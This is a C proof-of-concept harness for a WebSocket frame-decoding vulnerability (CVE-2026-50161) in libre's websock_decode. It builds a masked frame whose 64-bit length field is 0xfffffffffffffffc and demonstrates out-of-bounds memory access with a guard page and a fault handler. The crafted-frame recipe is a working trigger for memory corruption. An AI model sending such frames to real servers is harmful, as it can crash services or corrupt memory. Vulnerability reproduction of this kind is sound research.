/*
 * Direct-call harness for GHSA-hvxv-v2gp-v93h / CVE-2026-50161.
 * `websock_fn.inc` is extracted verbatim from a pinned src/websock/websock.c
 * by run.sh; this file supplies only the declarations and stubs the pinned
 * function needs.  No libre build, no network, no real server.
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/mman.h>

struct websock_hdr {
	uint8_t fin, rsv1, rsv2, rsv3, opcode, mask;
	uint64_t len;
	uint8_t mkey[4];
};

struct mbuf {
	uint8_t *buf;
	size_t pos, end;
};

static size_t mbuf_get_left(const struct mbuf *m) { return m->end - m->pos; }
static uint8_t mbuf_read_u8(struct mbuf *m) { return m->buf[m->pos++]; }
static uint16_t mbuf_read_u16(struct mbuf *m)
{
	uint16_t v;
	memcpy(&v, m->buf + m->pos, sizeof(v));
	m->pos += 2;
	return v;
}
static uint64_t mbuf_read_u64(struct mbuf *m)
{
	uint64_t v;
	memcpy(&v, m->buf + m->pos, sizeof(v));
	m->pos += 8;
	return v;
}
static uint8_t *mbuf_buf(const struct mbuf *m) { return m->buf + m->pos; }
static uint64_t sys_ntohll(uint64_t v) { return __builtin_bswap64(v); }

#include "websock_fn.inc"

#define HDR 14
#define PAY 16
#define SENT 32
#define KEY 0xb4

static void set_header(uint8_t *b, int attack)
{
	b[0] = 0x82;			 /* FIN=1, binary */
	b[1] = 0xff;			 /* MASK=1, len=127 */
	if (attack) {
		for (int i = 2; i < 10; i++) b[i] = 0xff;
		b[9] = 0xfc;		 /* 64-bit length = 0xfffffffffffffffc */
	} else {
		for (int i = 2; i < 10; i++) b[i] = 0x00;
		b[9] = 0x08;		 /* safe masked frame: len = 8 */
	}
	for (int i = 10; i < 14; i++) b[i] = KEY;
}

#ifndef PLAIN

int main(int argc, char **argv)
{
	int attack = (argc < 2 || strcmp(argv[1], "attack") == 0);
	size_t pay = attack ? PAY : 8;
	uint8_t *mb = malloc(HDR + pay);
	if (!mb) return 90;

	memset(mb, 0, HDR + pay);
	set_header(mb, attack);

	printf("CRAFT_B0=%02x CRAFT_B1=%02x MASKBIT=%u LENBYTES=%02x%02x%02x%02x%02x%02x%02x%02x KEY=%02x%02x%02x%02x\n",
	       mb[0], mb[1], mb[1] >> 7, mb[2], mb[3], mb[4], mb[5],
	       mb[6], mb[7], mb[8], mb[9], mb[10], mb[11], mb[12], mb[13]);
	fflush(stdout);

	struct mbuf m = { mb, 0, HDR + pay };
	struct websock_hdr h;
	memset(&h, 0, sizeof(h));

	int rc = websock_decode(&h, &m);

	printf("MODE=%s RC=%d HDR_LEN=0x%016llx MASK=%u MKEY=%02x%02x%02x%02x\n",
	       attack ? "attack" : "safe", rc, (unsigned long long)h.len, h.mask,
	       h.mkey[0], h.mkey[1], h.mkey[2], h.mkey[3]);
	printf("PAYLOAD_FIRST=%02x PAYLOAD_LAST=%02x CONSUMED=%zu\n",
	       mb[HDR], mb[HDR + pay - 1], m.pos);
	fflush(stdout);
	free(mb);
	return 0;
}

#else  /* PLAIN: guard-page run, no ASan, deterministic SIGSEGV readback */

static uint8_t *g_p, *g_oob, *g_sent;
static size_t g_sentlen;

static void emit(const char *s) { (void)write(1, s, strlen(s)); }
static void puthex2(uint8_t b, char *o)
{
	static const char hx[] = "0123456789abcdef";
	o[0] = hx[b >> 4]; o[1] = hx[b & 15];
}
static void putnum(size_t v, char *o, size_t *k)
{
	char t[24]; size_t n = 0;
	if (!v) t[n++] = '0';
	while (v) { t[n++] = (char)('0' + v % 10); v /= 10; }
	while (n) o[(*k)++] = t[--n];
}

static void segv(int sig, siginfo_t *si, void *uc)
{
	(void)sig; (void)uc;
	char b[1024]; size_t k = 0, off;
#define LIT(s) do { memcpy(b + k, (s), sizeof(s) - 1); k += sizeof(s) - 1; } while (0)
	LIT("PLAIN_FIRST_OOB_OFFSET="); putnum((size_t)(g_oob - g_p), b, &k); b[k++] = '\n';
	LIT("PLAIN_FAULT_OFFSET=");
	off = (size_t)((uint8_t *)si->si_addr - g_p);
	putnum(off, b, &k); b[k++] = '\n';
	LIT("PLAIN_ADJACENT=");
	for (size_t i = 0; i < g_sentlen; i++) { puthex2(g_sent[i], b + k); k += 2; }
	b[k++] = '\n';
	(void)write(1, b, k);
	_exit(0);
}

int main(void)
{
	long ps = sysconf(_SC_PAGESIZE);
	if (ps < 4096) return 91;
	uint8_t *base = mmap(NULL, (size_t)ps * 2, PROT_READ | PROT_WRITE,
			     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED) return 92;
	if (mprotect(base + ps, (size_t)ps, PROT_NONE)) return 93;

	uint8_t *mb = base + ps - HDR - PAY - SENT;
	memset(mb, 0, HDR + PAY + SENT);
	memset(mb + HDR + PAY, 0xee, SENT);
	set_header(mb, 1);

	g_p = mb + HDR + 4;	     /* mbuf_buf() after the 4 mask bytes */
	g_oob = mb + HDR + PAY;	     /* first byte past the mbuf region */
	g_sent = g_oob;
	g_sentlen = SENT;

	struct sigaction sa;
	memset(&sa, 0, sizeof(sa));
	sa.sa_sigaction = segv;
	sa.sa_flags = SA_SIGINFO;
	if (sigaction(SIGSEGV, &sa, NULL)) return 94;

	char pre[600]; size_t k = 0;
#define PRE(s) do { memcpy(pre + k, (s), sizeof(s) - 1); k += sizeof(s) - 1; } while (0)
	PRE("REGION_BYTES=30 PAYLOAD_BYTES=16 SENTINEL_BYTES=32 KEY=0xb4\n");
	PRE("PLAIN_PRE_ADJACENT=");
	for (size_t i = 0; i < SENT; i++) { puthex2(mb[HDR + PAY + i], pre + k); k += 2; }
	pre[k++] = '\n';
	(void)write(1, pre, k);

	struct mbuf m = { mb, 0, HDR + PAY };
	struct websock_hdr h;
	memset(&h, 0, sizeof(h));
	int rc = websock_decode(&h, &m);	/* must not return on vulnerable pin */
	printf("UNEXPECTED_RETURN rc=%d len=0x%016llx\n", rc,
	       (unsigned long long)h.len);
	fflush(stdout);
	return 95;
}
#endif
